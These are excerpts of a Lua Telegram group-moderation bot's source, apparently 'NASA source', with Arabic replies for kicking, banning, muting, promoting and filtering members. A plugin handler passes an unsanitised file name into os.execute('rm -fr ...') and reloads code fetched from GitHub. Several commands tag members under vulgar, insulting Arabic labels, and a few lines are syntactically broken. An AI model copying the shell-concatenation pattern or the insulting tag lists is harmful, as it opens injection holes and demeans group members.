send(msg.chat_id_, msg.id_," 么 لا يوجد اتصال من ال api \n") 
end
return false
end
end
...
t = " 么 بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/Marawanx100/FlassTas/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('BOYKA.lua')  
else
send(msg.chat_id_, msg.id_," 么 عذرا الملف لايدعم سورس ناسا \n") 
end
return false
end
...
if file_bot then
io.close(file_bot)
t = " 么 بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " 么 الملف » "..file.."\n 么 تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/Marawanx100/FlassTas/master/File_Bot/"..file)
...
send(msg.chat_id_,msg.id_," 么 تم مسح الملفات")
return false
end
...
if #list == 0 then
t = " 么 لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
send(msg.chat_id_, msg.id_," 么 حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "SOURCENASA")
send(msg.chat_id_, msg.id_," 么 منشئ الجروب » ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
...
if num2 == 0 then
send(msg.chat_id_, msg.id_," 么 لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," 么 تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح الادمنيه')
end
...
send(msg.chat_id_, msg.id_,' 么 تم تعطيل الرفع') 
return false
end
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح المنظفيه')
end
...
send(msg.chat_id_, msg.id_,' 么 تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 么  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 么 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
...
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
send(msg.chat_id_, msg.id_, ' 么 لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
...
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n 么 قائمة مميزين الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 么 لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 么 العضو » '..userid..''
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الخولات')
end

if text == ("تاج للخولات") or text == ("تاك للخولات") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة خولات الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الاكساس')
end

if text == ("تاج للاكساس") or text == ("تاك للاكساس") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة اكساس الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الكس [@"..username.."]\n"
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع المتخزوقين')
end

if text == ("تاج للمتخزوقين") or text == ("تاك للمتخزوقين") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة متخزوقين الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الحكاكين')
end

if text == ("تاج للحكاكين") or text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة حكاكين الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么  تم مسح جميع العرر')
end
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么  تم مسح جميع الخنازير')
end

if text == ("تاج للخنازير") or text == ("تاك للخنازير") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة خنازير الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الفرسات')
end

if text == ("تاج للفرسات") or text == ("تاك للفرسات") and Mod(msg) then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n 么 قائمة فرسات الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع المزز')
end
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الكلاب')
end
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع الحمير')
end
...
database:del(bot_id..'zoga:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع المتوحدات')
end

if text == ("تاج للمتوحدات") or text == ("تاك للمتوحدات") and Mod(msg) then
local list = database:smembers(bot_id..'zoga:User'..msg.chat_id_)
t = "\n 么 قائمة متوحدات الجروب \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح جميع اللي بقلبك')
end
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 么 تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 么 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
usertext = '\n 么  المستخدم » ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n 么 تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' 么 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' 么 انا لست محظورآ \n') 
return false 
end
...
send(msg.chat_id_, msg.id_, ' 么 تم مسح المكتومين')
end
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 么 البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 么 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么 تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 么 البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع تقييد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع تقييد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع تقييد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么 تم تقييده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n 么 عذرا لا تستطيع تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么  الايدي » `'..result.sender_user_id_..'`\n 么  تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n ​么 الايدي » '..result.sender_user_id_..'\n 么  تم رفعه مشرف بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
...
usertext = '\n 么  العضو » ['..result.title_..'](t.me/'..(username or 'WviivW')..')'
status  = '\n 么  تم رفعه مشرف بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 么  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n 么  الايدي » '..result.sender_user_id_..'\n 么  تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
local text = 
'\n 么 اعدادات الجروب كتالي √↓'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n 么  علامة ال {✓} تعني معطل'..
'\n 么  علامة ال {✘} تعني مفعل'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n 么  الروابط » { '..lock_links..
' }\n'..' 么  المعرفات » { '..lock_user..
' }\n'..' 么  التاك » { '..lock_hash..
' }\n'..' 么  البوتات » { '..lock_bots..
' }\n'..' 么  التوجيه » { '..lock_fwd..
' }\n'..' 么  التثبيت » { '..lock_pin..
' }\n'..' 么  الاشعارات » { '..lock_tagservr..
' }\n'..' 么  الماركدون » { '..lock_mark..
' }\n'..' 么  التعديل » { '..lock_edit..
' }\n'..' 么  تعديل الميديا » { '..lock_edit_med..
' }\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..' 么  الكلايش » { '..lock_spam..
' }\n'..' 么  الكيبورد » { '..lock_inlin..
' }\n'..' 么  الاغاني » { '..lock_vico..
' }\n'..' 么  المتحركه » { '..lock_gif..
' }\n'..' 么  الملفات » { '..lock_file..
' }\n'..' 么  الدردشه » { '..lock_text..
...
' }\n'..' 么  التكرار » { '..flood..
' }\n'..' 么  الترحيب » { '..welcome..
' }\n'..' 么  عدد التكرار » { '..NUM_MSG_MAX..
' }\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n 么  علامة ال {✓} تعني مفعل'..
'\n 么  علامة ال {✘} تعني معطل'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..' 么  امر تاج » { '..kickme..
' }\n'..' 么  امر اطردني » { '..sehuser..
' }\n'..' 么  امر مين ضافني » { '..addme..
' }\n'..' 么  ردود المدير » { '..rdmder..
' }\n'..' 么  الردود العامه » { '..rdsudo..
' }\n'..' 么  الايدي » { '..idgp..
' }\n'..' 么  الايدي بالصوره » { '..idph..
' }\n'..' 么  الرفع » { '..setadd..
' }\n'..' 么  الحظر » { '..banm..' }\n\n┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉  ┉  ┉\n 么  CH » @SOURCENASA\n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_,msg.id_," 么 عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 么 تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," 么 انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," 么 لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 么 ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
...
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," 么 عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 么 تم الغاء تثبيت الرساله")   
...
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"么 تم الغاء تثبيت الكل")   
...
send(msg.chat_id_,msg.id_," 么 حسنآ ارسل اليه الرابط الان")
...
send(msg.chat_id_, msg.id_," 么 تم تفعيل الرابط") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 么 تم تعطيل الرابط") 
return false end
end
...
send(msg.chat_id_, msg.id_," 么 تم تفعيل الصوره") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 么 تم تعطيل الصوره") 
return false end
end
if text == "الرابط" then 
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_," 么 الرابط معطل") 
return false  
end
...
linkgp = ' 么 لا يوجد رابط ارسل ضع رابط'
end  
...
send(msg.chat_id_,msg.id_," 么 تم مسح الرابط")           
...
send(msg.chat_id_, msg.id_,' 么 ارسل لي الصوره') 
return false
end
...
send(msg.chat_id_, msg.id_,' 么 تم ازالة صورة الجروب') 
end
return false  
end
...
send(msg.chat_id_, msg.id_,' 么 ارسل الان الوصف')
end
return false  
end
...
t  = ' 么 ارسل لي الترحيب الان'
tt = '\n 么 تستطيع اضافة مايلي !\n 么 دالة عرض الاسم »{`name`}\n 么 دالة عرض المعرف »{`user`}'
...
GetWelcome = ' 么 لم يتم تعيين ترحيب للجروب'
end 
...
send(msg.chat_id_, msg.id_,' 么 تم تفعيل ترحيب الجروب') 
return false  
end
...
send(msg.chat_id_, msg.id_,' 么 تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 么 تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," 么 ارسل الكلمه لمنعها")  
...
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," 么 ارسل التحذير عند ارسال الكلمه")  
...
if test == "repp" then  
send(msg.chat_id_, msg.id_," 么 تم منع الكلمه مع التحذير")  
...
send(msg.chat_id_, msg.id_," 么 ارسل الكلمه الان")  
database:set(bot_id.."BOYKA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."BOYKA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," 么 تم الغاء منعها")  
database:del(bot_id.."BOYKA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
send(msg.chat_id_, msg.id_," 么 تم مسح قائمه المنع")  
end
...
send(msg.chat_id_,msg.id_,' 么 تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' 么 تم حفظ كليشة المطور')
return false
end
-----------------
...
send(msg.chat_id_, msg.id_, ' 么 تم ازالة كليشة الايدي')
end
return false  
end 
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 么 تم الغاء تعيين الايدي") 
...
send(msg.chat_id_, msg.id_,' 么 تم تعيين الايدي')    
end
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " 么 لا توجد بوتات في الجروب")
else
local t = ' 么 عدد البوتات هنا >> {'..c..'}\n 么 عدد البوتات التي هي ادمن >> {'..x..'}\n 么 تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
...
if #admins == i then 
local a = '\n◎ ══════ ❈ ══════ ◎\n 么 عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' 么 عدد البوتات التي هي ادمن >> {'..t..'}\n 么 ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " 么 تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," 么 تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
send(msg.chat_id_,msg.id_," 么 ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," 么 تم ازالة قوانين الجروب")  
...
send(msg.chat_id_, msg.id_," 么 لا توجد قوانين")   
end    
end
...
send(msg.chat_id_, msg.id_,' 么 تم طرد المحذوفين')
end,nil)
end
end
...
if #list == 0 then
send(msg.chat_id_, msg.id_,' 么 لا توجد صلاحيات مضافه')
return false
end
t = "\n 么 قائمة الصلاحيات المضافه \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_, " 么 ارسل نوع الرتبه \n 么 {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
...
send(msg.chat_id_, msg.id_, "* 么 تم مسح الصلاحيه *\n") 
end
...
send(msg.chat_id_, msg.id_"* 么 تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n 么 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* 么 تستطيع اضافه صلاحيات {مميز - عضو} \n 么 ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* 么  تستطيع اضافه صلاحيات {عضو} \n 么 ارسل الصلاحيه مجددا*\n") 
return false
end
end
...
send(msg.chat_id_, msg.id_, " 么 تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 么 العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SOURCENASA')..')'..'\n 么 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,' 么 تم مسح رسائلك'  )  
...
send(msg.chat_id_, msg.id_,' 么 عدد رسائلك » { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,'么تستطيع المسح 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,'么 تم حذف {'..num..'}')  
...
local Message = v
if Message then
t = "么 تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."VVVZVV:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "么 لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
...
local numl = v
if numl then
l = "么 عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = "么 لا يوجد ميديا في المجموعه"
end
...
send(msg.chat_id_, msg.id_,'么 تم تنظيف جميع الرسائل المعدله')
end
...
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 么 ارسل لي الاسم الان ")  
end
return false
end
...
send(msg.chat_id_, msg.id_,' 么 الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 么 ليست لدي صلاحية تغيير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' 么 تم تغيير اسم الجروب الى {['..Name..']}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_," 么 لا تستطيع تنزيل المطور الاساسي")
return false 
end
...
send(msg.chat_id_, msg.id_,"\n 么 تم تنزيل الشخص من الرتب التاليه \n 么 { "..dev..''..cu..''..crr..''..cr..''..own..''..mod..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n 么  عذرا العضو لايملك رتبه \n")
end
...
send(msg.chat_id_, msg.id_," 么 تم مسح الردود العامه")
end

if text == ("الردود العامه") and SudoBot(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n 么 قائمة الردود العامه \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' 么 تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 么 ارسل الرد الذي تريد اضافته')
...
send(msg.chat_id_, msg.id_,' 么 تم ازالة الرد العام')
...
send(msg.chat_id_, msg.id_,' 么 ارسل الكلمه تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 么 ارسل الكلمه تريد حذفها')
...
send(msg.chat_id_, msg.id_," 么 تم مسح ردود المدير")
end

if text == ("ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " 么 قائمه ردود المدير \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' 么 تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
...
send(msg.chat_id_, msg.id_,' 么 ارسل الكلمه التي تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 么 ارسل الكلمه التي تريد حذفها')
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ناسا').." غادر" or text == 'غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'么 تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
...
Text = ' 么 تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and SudoBot(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' 么 تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' 么 بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end
...
Text = '\n 么 تم تعطيل ردود المدير' 
else
Text = '\n 么 بالتاكيد تم تعطيل ردود المدير'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تفعيل الردود العامه' 
else
Text = '\n 么 بالتاكيد تم تفعيل الردود العامه'
end
